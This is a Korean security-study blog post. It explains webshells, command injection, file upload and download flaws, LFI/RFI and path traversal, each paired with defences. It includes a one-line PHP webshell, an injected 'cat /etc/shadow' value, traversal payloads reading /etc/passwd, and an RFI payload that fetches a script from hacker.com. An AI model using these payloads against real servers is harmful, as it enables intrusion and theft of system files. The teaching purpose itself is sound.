---
layout: default
title: "[System Takeover] Webshell, Command Injection 및 File 취약점 정리"
date: 2026-05-11
categories: Hacking
---

## System Takeover (시스템 탈취)

<span class="text-red">※ 절대 허용되지 않은 사이트나 서버에 해킹 및 공격은 범죄이므로 이점 명심해야 한다.</span>

---

### 1. *What is Webshell*

#### 1) Shell(셸)이란?
사용자가 입력한 명령어를 운영체제(OS)가 이해할 수 있도록 전달해 주는 인터페이스 프로그램이다. (예: Windows의 `cmd.exe`, `powershell.exe`, Linux의 `bash` 등)

#### 2) Webshell이란?
해커가 원격에서 웹 서버에 명령을 내릴 수 있도록 만들어진 **웹 기반의 악성 스크립트 파일**(PHP, JSP, ASP 등)이다. GUI 환경을 제공하기도 하며, 웹 서버의 권한을 이용해 시스템을 통제하는 **백도어(Backdoor)** 역할을 한다.

#### <span class="text-red">How to upload & use? (Exploitation)</span>

>```php
># 단순한 형태의 PHP 웹셸 예시 (One-Liner Webshell)
><?php system($_GET['cmd']); ?>
>
># 공격 URL 예시 (OS 명령어 실행)
>http://target.com/uploads/webshell.php?cmd=cat /etc/passwd
>```

- **업로드**: 게시판의 첨부파일, 프로필 사진 업로드 등 파일이 서버로 전송되는 모든 곳이 타겟이다. 확장자 검증을 우회(`shell.php.jpg`, `%00` Null Byte Injection 등)하여 서버에 스크립트를 올린다.
- **이용**: 업로드된 파일의 웹 경로를 찾아 브라우저로 접근한 뒤, 파라미터를 통해 리눅스/윈도우 명령어를 실행하여 서버를 제어한다.

#### 3) 방어 방법 (Defense)
- **확장자 화이트리스트(Whitelist)**: 허용된 확장자(jpg, png 등)만 업로드 가능하게 철저히 검증한다.
- **실행 권한 제거**: 파일이 업로드되는 디렉토리(`/uploads`)의 스크립트 실행 권한을 웹 서버 설정에서 제거한다.
- **파일명 난수화**: 업로드 시 파일명을 예측 불가능한 난수(UUID 등)로 변경하고 확장자를 강제하여 저장한다.

---

### 2. *What is Command Injection*

#### Command Injection이란?
웹 애플리케이션이 사용자 입력값을 필터링 없이 시스템 셸 호출 함수(`system()`, `exec()`, `os.popen()` 등)의 인자로 그대로 전달할 때 발생하는 취약점이다. 

#### <span class="text-red">Core of Command Injection</span>

>```python
># 취약한 백엔드 코드 (Python)
>target_ip = request.form['ip']
>os.system("ping -c 3 " + target_ip)
>
># 공격자의 입력값 (메타 문자 악용)
>IP = "8.8.8.8; cat /etc/shadow"
>""" 완성된 명령어: ping -c 3 8.8.8.8; cat /etc/shadow """
>```

- **공격자 관점**: 해커는 정상적인 입력값 뒤에 OS 셸에서 쓰이는 메타 문자(`;`, `&&`, `|`, `||`)를 덧붙여, 개발자가 의도하지 않은 악의적인 시스템 명령어가 연달아 실행되도록 조작한다. 웹셸 업로드 없이도 곧바로 RCE(원격 명령 실행)가 가능하다.

---

### 3. *File Vulnerability (파일 취약점)*

#### 1) File Upload 악용 방법 + 방어 방법
- **악용**: 앞서 설명한 웹셸(Webshell)을 업로드하여 RCE를 유발하거나, 악성 HTML 파일을 업로드하여 Stored XSS를 유발한다.
- **방어**: 업로드 폴더 실행 권한 제거, 엄격한 화이트리스트 기반 확장자 및 MIME 타입 검증, 바이러스 스캔 연동.

#### 2) File Download 악용 방법 + 방어 방법
- **악용**: 파라미터로 파일명을 받아 다운로드해 주는 기능에서, 경로 탐색(`../`) 기법을 섞어 서버의 민감한 파일(소스코드, DB 설정 파일 등)을 빼낸다.
- **방어**: 다운로드할 파일을 식별할 때 파일명 자체가 아닌 데이터베이스에 매핑된 **식별자(Index ID)** 를 사용한다.

#### 3) LFI/RFI란? + 방어 방법
파일을 **다운**받는 것이 아니라, 서버 내부 스크립트 엔진(PHP 등)이 해당 파일을 **실행(Include)** 해버리는 치명적인 취약점이다.

>```php
># 취약한 코드
>include($_GET['page'] . ".php");
>```

- **LFI (Local File Inclusion)**: 서버 로컬에 있는 파일을 로드한다. (예: `page=../../../../etc/passwd%00`) 주로 서버의 로그 파일에 악성 코드를 남긴 뒤 LFI로 해당 로그 파일을 실행시키는 기법(Log Poisoning)을 쓴다.
- **RFI (Remote File Inclusion)**: 외부 해커 서버에 있는 악성 스크립트를 타겟 서버가 가져와서 실행하게 만든다. (예: `page=http://hacker.com/shell.txt?`)
- **방어 방법**:
  - PHP 설정에서 `allow_url_include = Off` 설정 (RFI 방어).
  - 사용자 입력값을 파일 인클루드 함수에 직접 넣지 않고, 서버에 미리 정의된 배열(배열 인덱스)이나 스위치 문을 통해서만 로드되도록 설계한다.

---

### 4. *Path Traversal (경로 탐색)*

#### Path Traversal이란? (Directory Traversal)
웹 애플리케이션이 파일의 경로를 처리할 때, 상위 디렉토리로 이동할 수 있는 문자열(`../` 또는 `..\`)을 필터링하지 않아 **웹 루트(Web Root) 디렉토리를 벗어나 운영체제의 시스템 파일에 접근**할 수 있는 취약점이다. File Download 취약점이나 LFI 취약점의 핵심 기반이 되는 기법이다.

#### <span class="text-red">Path Traversal 공격 예시</span>

>```bash
># 공격자는 반복적인 상위 디렉토리 이동을 통해 시스템 최상위 루트(/)로 빠져나간다.
>http://target.com/download.php?file=../../../../../../../../etc/passwd
>http://target.com/images.php?img=..\..\..\..\windows\win.ini
>```

#### 방어 방법
- **입력값 필터링**: `../`, `..\`, `..`, `/`, `\` 등의 문자를 정규식으로 차단한다. (해커는 `%2e%2e%2f` 처럼 URL 인코딩으로 우회하려 시도할 것이므로 디코딩 후 검증해야 한다.)
- **절대 경로 검증**:
  >```php
  ># PHP realpath() 함수를 이용한 방어 예시
  >$basepath = '/var/www/html/downloads/';
  >$requested_file = realpath($basepath . $_GET['file']);
  >
  ># 최종 해석된 경로가 $basepath로 시작하는지 검증 (벗어났다면 차단)
  >if (strpos($requested_file, $basepath) === 0) { ... }
  >```
- 파일명만 허용하도록 `basename()` 같은 함수를 사용하여 경로 정보 자체를 날려버리는 것도 좋은 방법이다.
